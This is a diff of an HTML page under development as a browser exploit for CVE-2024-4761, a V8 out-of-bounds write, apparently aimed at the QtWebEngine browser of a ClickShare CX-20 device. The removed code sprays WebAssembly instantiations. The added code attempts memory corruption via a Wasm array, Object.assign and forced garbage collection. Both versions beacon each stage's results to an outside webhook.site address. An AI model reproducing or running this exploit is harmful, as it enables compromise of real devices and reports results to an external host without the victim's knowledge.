@@ -1,110 +1,37 @@
-<html><body>
-<pre id="log"></pre>
+<!doctype html><html><head><meta charset=utf-8><title>t4761</title></head><body>
 <script>
-function beacon(t, v){
-  try { fetch('https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d/?t='+t+'&v='+encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+var SINK='https://webhook.site/b8cf5fa7-31ac-49d7-b947-31db2123c033';
+function b(v){v=String(v).slice(0,180);try{navigator.sendBeacon(SINK+'/b?t='+encodeURIComponent(v),'')}catch(e){}try{fetch(SINK+'?t='+encodeURIComponent(v),{mode:'no-cors'})}catch(e){}}
+b('s0-start '+(navigator.userAgent.match(/Chrome\/[0-9.]+/)||['?'])[0]);
+var HEX='0061736d01000000010c0250005e7f0160017f016b00030201010710010c6372656174655f617272617900000a090107002000fb1c000b0016046e616d65010f01000c6372656174655f6172726179';
+var bytes=new Uint8Array(HEX.length/2);
+for(var i=0;i<bytes.length;i++) bytes[i]=parseInt(HEX.substr(i*2,2),16);
+b('s1-validate:'+WebAssembly.validate(bytes));
+var inst=null, wasm_array=null;
+try { inst=new WebAssembly.Instance(new WebAssembly.Module(bytes)); b('s2-inst:ok'); }
+catch(e){ b('s2-inst:ERR '+(e&&e.message)); }
+if(inst){
+  try { wasm_array=inst.exports.create_array(0); b('s3-array:ok '+(typeof wasm_array)); }
+  catch(e){ b('s3-array:ERR '+(e&&e.message)); }
 }
-
-let log = document.getElementById('log');
-function l(s) { log.textContent += s + '\n'; }
-
-beacon('start', '4761');
-
-// CVE-2024-4761: OOB write in V8 builtins
-// Issue: 339458194, Fixed: 124.0.6367.207
-// Target: ClickShare CX-20 QtWebEngine 6.7.2 Chrome 118.0.5993.220 aarch64
-// Maglev: OFF (builtins run in TF-compiled code, unaffected)
-//
-// Bug: type confusion when WasmObject passed where WasmModuleObject expected
-// Check: wasm_object.is<WasmModuleObject>() fails on WasmMemoryObject
-//
-// Trigger: exercise many Wasm instantiation paths with different object types
-
-// Pattern 1: instantiate with various import objects
-function p1_instantiate_variants() {
-  let bytes = new Uint8Array([
-    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x05,0x01,0x60,0x01,0x7f,0x01,0x7f,
-    0x03,0x02,0x01,0x00,
-    0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,
-    0x0a,0x08,0x01,0x06,0x00,0x20,0x00,0x41,0x01,0x6a,0x0b
-  ]);
-  let mod = new WebAssembly.Module(bytes);
-  for (let i = 0; i < 500; i++) {
-    new WebAssembly.Instance(mod, {});
-  }
-  return 500;
+if(wasm_array){
+  var src={}, i;
+  for(i=0;i<(1020+1);i++) src['p'+i]=1;
+  src.__defineGetter__('p0',function(){throw new Error('bailout');});
+  var dummy={}; dummy.i1=0;dummy.i2=0;dummy.i3=0;dummy.i4=0;
+  for(i=1;i<=16;i++) dummy['p'+i]=0;
+  var o={}; o.i1=0;o.i2=0;o.i3=0;o.i4=0; o.p1=0;
+  for(i=2;i<=15;i++) o['p'+i]=0;
+  o.p16=0;
+  var arr1=[1.1]; var arr2=[{}];
+  b('s4-pre arr1.len='+arr1.length+' arr2.len='+arr2.length);
+  try { Object.assign(wasm_array, src); b('s5-assign:no-throw'); }
+  catch(e){ b('s5-assign:throw '+(e&&e.name)+' '+(e&&String(e.message).slice(0,60))); }
+  b('s6-post arr1.len='+arr1.length+' arr2.len='+arr2.length);
+  try { for(i=0;i<200;i++) new ArrayBuffer(0x10000); b('s7-gcmin:ok'); } catch(e){ b('s7-gcmin:ERR'); }
+  try { new ArrayBuffer(0x7FE00000); b('s8-gcmaj:ok'); } catch(e){ b('s8-gcmaj:ERR'); }
+  try { o.p9=1024; o.p11=1024; b('s9-writes:ok'); } catch(e){ b('s9-writes:ERR'); }
+  b('s10-final arr1.len='+arr1.length+' arr2.len='+arr2.length+' a1elem='+arr1[0]+' a2elem='+String(arr2[0]));
+  b('done');
 }
-
-// Pattern 2: instantiate with memory import
-function p2_memory_import() {
-  let bytes = new Uint8Array([
-    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x04,0x01,0x60,0x00,0x00,
-    0x03,0x02,0x01,0x00,
-    0x07,0x07,0x01,0x03,0x64,0x6f,0x6e,0x65,0x00,0x00,
-    0x0a,0x05,0x01,0x03,0x00,0x41,0x00,0x0b
-  ]);
-  let mod = new WebAssembly.Module(bytes);
-  let mem = new WebAssembly.Memory({initial: 1});
-  let imports = {env: {memory: mem}};
-  for (let i = 0; i < 500; i++) {
-    try { new WebAssembly.Instance(mod, imports); } catch(e) { break; }
-  }
-  return 500;
-}
-
-// Pattern 3: compile + instantiate
-function p3_compile_instantiate() {
-  let bytes = new Uint8Array([
-    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x05,0x01,0x60,0x01,0x7f,0x01,0x7f,
-    0x03,0x02,0x01,0x00,
-    0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,
-    0x0a,0x08,0x01,0x06,0x00,0x20,0x00,0x41,0x01,0x6a,0x0b
-  ]);
-  for (let i = 0; i < 300; i++) {
-    try {
-      let mod = WebAssembly.compileSync(bytes);
-      new WebAssembly.Instance(mod, {});
-    } catch(e) { break; }
-  }
-  return 300;
-}
-
-// Pattern 4: multiple exports
-function p4_multi_export() {
-  let bytes = new Uint8Array([
-    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x0a,0x02,0x60,0x00,0x00,0x60,0x01,0x7f,0x01,0x7f,
-    0x03,0x04,0x02,0x00,0x00,
-    0x07,0x0f,0x02,0x03,0x61,0x64,0x64,0x00,0x01,0x03,0x64,0x6f,0x6e,0x65,0x00,0x00,
-    0x0a,0x0e,0x02,0x03,0x00,0x41,0x00,0x0b,0x06,0x00,0x20,0x00,0x41,0x01,0x6a,0x0b
-  ]);
-  let mod = new WebAssembly.Module(bytes);
-  for (let i = 0; i < 300; i++) {
-    try { new WebAssembly.Instance(mod, {}); } catch(e) { break; }
-  }
-  return 300;
-}
-
-// Pattern 5: typed array operations
-function p5_typed_arrays() {
-  let buf = new ArrayBuffer(65536);
-  for (let i = 0; i < 10000; i++) {
-    let arr = new Uint8Array(buf, i % 4096, 256);
-    arr[0] = i;
-  }
-  return 10000;
-}
-
-// Run all patterns
-beacon('p1', String(p1_instantiate_variants()));
-beacon('p2', String(p2_memory_import()));
-beacon('p3', String(p3_compile_instantiate()));
-beacon('p4', String(p4_multi_export()));
-beacon('p5', String(p5_typed_arrays()));
-beacon('done', '4761');
-l('DONE');
-</script>
-</body></html>
+</script></body></html>
